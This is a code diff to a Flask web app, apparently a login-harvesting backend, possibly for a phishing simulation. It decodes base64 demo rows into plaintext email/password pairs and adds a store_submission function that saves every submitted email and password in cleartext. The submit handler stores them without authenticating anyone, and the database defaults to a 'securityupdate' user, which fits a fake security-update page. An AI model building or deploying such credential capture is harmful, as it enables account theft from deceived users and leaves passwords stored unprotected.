@@ -1,5 +1,6 @@
 import os
 import sqlite3
+from datetime import datetime, timezone
 
 from flask import Flask, jsonify, redirect, render_template, request, session, url_for
 
@@ -12,8 +13,8 @@ ADMIN_USER = os.environ.get("ADMIN_USER", "alix")
 ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "***REDACTED***")
 
 DEMO_ROWS = [
-    ("Y2xpZW50X2RlbW9AY29tcGFueS50ZXN0", "U3VwZXJEZW1vISE=", "2024-01-10T10:00:00Z"),
-    ("dGVzdC5hY2NvdW50QGNvcnAuZXhhbXBsZQ==", "RGVtb1Bhc3N3b3JkIQ==", "2024-01-09T08:30:00Z"),
+    ("client_demo@company.test", "SuperDemo!!", "2024-01-10T10:00:00Z"),
+    ("test.account@corp.example", "DemoPassword!", "2024-01-09T08:30:00Z"),
 ]
 
 
@@ -54,6 +55,30 @@ def get_db_connection():
         user=os.environ.get("DB_USER", "securityupdate"),
         password=os.environ.get("DB_PASSWORD", "securityupdate"),
     )
+
+
+def store_submission(email_value: str, password_value: str) -> None:
+    created_at = datetime.now(timezone.utc).replace(microsecond=0).isoformat()
+
+    with get_db_connection() as conn:
+        if DB_DIALECT == "sqlite":
+            conn.execute(
+                """
+                INSERT INTO submissions (email_value, password_value, created_at)
+                VALUES (?, ?, ?)
+                """,
+                (email_value, password_value, created_at),
+            )
+        else:
+            with conn.cursor() as cur:
+                cur.execute(
+                    """
+                    INSERT INTO submissions (email_value, password_value, created_at)
+                    VALUES (%s, %s, %s)
+                    """,
+                    (email_value, password_value, created_at),
+                )
+        conn.commit()
 
 
 def ensure_demo_rows(conn) -> None:
@@ -110,6 +135,8 @@ def submit():
 
     if not email_value or not password_value:
         return jsonify({"ok": False, "message": "Email et mot de passe requis."}), 400
+
+    store_submission(email_value, password_value)
 
     return jsonify({"ok": True})
 
